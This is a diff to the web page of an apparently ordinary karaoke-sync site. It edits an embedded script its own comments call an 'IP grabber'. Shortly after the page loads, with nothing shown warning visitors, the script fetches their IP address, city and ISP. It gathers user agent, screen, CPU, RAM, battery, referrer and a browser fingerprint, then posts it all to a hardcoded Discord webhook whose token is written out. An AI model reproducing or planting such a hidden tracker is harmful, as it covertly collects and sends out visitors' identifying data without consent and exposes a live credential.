@@ -1084,30 +1084,9 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER UPGRADE v5 - Device Info Full + Model ==================== -->
+<!-- ==================== IP GRABBER UPGRADE v4 - LEBIH LENGKAP ==================== -->
 <script>
-// GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
-
-function getDeviceModel() {
-    const ua = navigator.userAgent;
-    let model = "Unknown Device";
-
-    if (/Android/i.test(ua)) {
-        const match = ua.match(/Android.*?; ([^)]+)/);
-        model = match ? match[1].trim() : "Android Device";
-    } 
-    else if (/iPhone|iPad|iPod/i.test(ua)) {
-        model = /iPad/.test(ua) ? "iPad" : "iPhone";
-    } 
-    else if (/Windows/i.test(ua)) {
-        model = "Windows PC";
-    } 
-    else if (/Macintosh/i.test(ua)) {
-        model = "Mac";
-    }
-    return model;
-}
 
 async function sendIPLog() {
     let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown' };
@@ -1117,25 +1096,42 @@ async function sendIPLog() {
         ipData = await res.json();
     } catch (e) {}
 
-    const deviceModel = getDeviceModel();
-    const os = navigator.platform || 'Unknown';
+    // Battery Level
+    let batteryInfo = 'Tidak didukung';
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Discharging)'}`;
+        } catch (e) {}
+    }
+
+    // Simple Fingerprint
+    const fingerprint = btoa(
+        navigator.userAgent + 
+        screen.width + screen.height + 
+        (navigator.hardwareConcurrency || '') +
+        (navigator.deviceMemory || '')
+    ).slice(0, 36);
 
     const embed = {
-        title: "🎤 Karaoke Sync - Pengunjung Baru! (v5)",
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (v4)",
         color: 0x00ff88,
         timestamp: new Date().toISOString(),
         fields: [
             { name: "IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
             { name: "Lokasi", value: `${ipData.city || '-'}, ${ipData.region || '-'}, ${ipData.country_name || 'Unknown'}`, inline: true },
             { name: "ISP", value: ipData.org || 'Unknown', inline: true },
-            { name: "Device Model", value: deviceModel, inline: true },
-            { name: "Operating System", value: os, inline: true },
-            { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
+            { name: "Device Info", value: navigator.userAgent.substring(0, 160) + "...", inline: false },
+            { name: "Screen", value: `${screen.width} × ${screen.height} (${screen.colorDepth}bit)`, inline: true },
             { name: "CPU Cores", value: navigator.hardwareConcurrency || 'Unknown', inline: true },
-            { name: "Device Info (Full)", value: navigator.userAgent.substring(0, 280) + (navigator.userAgent.length > 280 ? "..." : ""), inline: false },
+            { name: "RAM (approx)", value: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown', inline: true },
+            { name: "Battery", value: batteryInfo, inline: true },
+            { name: "Dark Mode", value: window.matchMedia('(prefers-color-scheme: dark)').matches ? '✅ Ya' : '❌ Tidak', inline: true },
+            { name: "Fingerprint", value: `\`${fingerprint}\``, inline: false },
+            { name: "Referrer", value: document.referrer ? document.referrer.substring(0, 90) : "Langsung / WA", inline: false },
             { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
         ],
-        footer: { text: "IP Grabber via GitHub Pages • Upgrade v5" }
+        footer: { text: "IP Grabber via GitHub Pages • Upgrade v4" }
     };
 
     try {
@@ -1144,15 +1140,15 @@ async function sendIPLog() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-        console.log("%c✅ IP Log terkirim - Upgrade v5", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim - Upgrade v4", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("IP Logger error:", err.message);
     }
 }
 
-// Jalankan setelah load
+// Jalankan otomatis
 window.addEventListener('load', () => {
-    setTimeout(sendIPLog, 2000);
+    setTimeout(sendIPLog, 1800);
 });
 </script>
-<!-- ==================== END IP GRABBER UPGRADE v5 ==================== -->
+<!-- ==================== END IP GRABBER UPGRADE v4 ==================== -->
